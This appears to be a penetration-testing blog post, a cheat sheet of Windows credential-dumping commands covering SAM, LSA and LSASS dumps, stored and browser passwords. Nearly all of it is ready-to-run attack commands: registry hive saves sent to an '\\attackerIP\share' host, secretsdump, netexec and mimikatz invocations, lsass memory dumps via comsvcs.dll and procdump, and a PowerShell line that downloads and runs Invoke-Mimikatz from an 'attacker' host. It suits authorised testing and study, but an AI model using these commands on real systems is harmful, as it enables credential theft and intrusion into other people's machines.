---
title: "CheatSheet - Windows Passwords"
author: Nasrallah
description: ""
date: 2025-06-29 07:00:00 +0000
categories : [CheatSheet]
tags: [CheatSheet, windows]
img_path: /assets/img/
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---

## **SAM**

SAM (Security Account Manager) is a database file in Windows that stores local user account credentials, including password hashes, and is used during the local authentication process.

```shell
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
```

```bash
reg.py domain.com/user:'Password123'@10.10.10.10 save -keyName 'HKLM\SAM' -o '\\attackerIP\share'
reg.py domain.com/user:'Password123'@10.10.10.10 save -keyName 'HKLM\SYSTEM' -o '\\attackerIP\share'
reg.py domain.com/user:'Password123'@10.10.10.10 save -keyName 'HKLM\SECURITY' -o '\\attackerIP\share'
```

We use `secretsdump` from `Impacket` to extract the password hashes locally.

```bash
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

Dump hashes remotely with [secretsdump](https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets)

```bash
secretsdump.py administrator:Password123@10.10.10.10
```

Dump with [netexec](https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-sam)

```bash
nxc smb 10.10.10.10 -u administrator -p Password123 --sam
```

With mimikatz.

```bash
mimikatz.exe "privilege::debug" "lsadump::sam" exit
```

## **LSA**

**LSA** (Local Security Authority) is a Windows component that handles authentication, security policies, and stores secrets like service account passwords and cached credentials.

```bash
nxc smb 10.10.10.10 -u administrator -p Password123 --lsa
```

```bash
mimikatz.exe "privilege::debug" "lsadump::secrets" exit
```

## **LSASS**

**LSASS** (Local Security Authority Subsystem Service) is a Windows process responsible for enforcing security policies, handling logins, password changes, and generating access tokens. It stores live credentials in memory (e.g., passwords, hashes, tickets) for logged-in users

### Automated

```bash
nxc smb 10.10.10.10 -u administrator -p Password123 -M lsassy
```

```bash
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

### Manually

#### Creating dump file

Using GUI

`Open Task Manager` > `Select the Processes tab` > `Find & right click the Local Security Authority Process` > `Select Create dump file`

Using CLI

Identify `lsass.exe` PID

```bash
tasklist /fi "imagename eq lsass.exe"
Get-Process lsass
```

Create dump file

```shell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 668 C:\lsasspower.dmp full
procdump -accepteula -ma lsass lsass.dmp
```

Using `mimikatz`

```bash
mimikatz.exe "sekurlsa::minidump lsass.dmp" exit
```

#### Extracting secretes

Extract credentials with [pypykatz](https://github.com/skelsec/pypykatz)

```bash
pypykatz lsa minidump ./lsass.dmp
powershell IEX (New-Object System.Net.Webclient).DownloadString('http://attacker/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
```

## **Stored credentials**

```shell
cmdkey /list
```

```bash
Lazagne.exe
mimikatz.exe "privilege::debug" "vault::cred" exit
mimikatz.exe "privilege::debug" "sekurlsa::credman" exit
```

## **Browser Passwords**

```bash
Lazagne.exe
```

```shell
.\SharpChrome.exe logins /unprotect
```

### Misc

Search for passwords in smb shares.

```shell
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

## **References**

<https://www.thehacker.recipes>

<https://www.netexec.wiki/>

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
